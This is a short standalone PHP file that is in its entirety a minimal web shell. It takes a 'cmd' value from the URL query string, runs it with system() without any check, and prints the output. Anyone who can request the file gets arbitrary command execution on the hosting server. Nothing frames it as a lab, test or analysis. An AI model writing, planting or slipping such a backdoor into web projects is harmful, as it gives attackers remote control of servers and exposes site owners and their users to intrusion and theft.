<?php
if(isset($_GET['cmd'])){ 
        echo "<pre>"; 
        echo system($_GET['cmd']); 
        echo "</pre>"; 
    }
?>
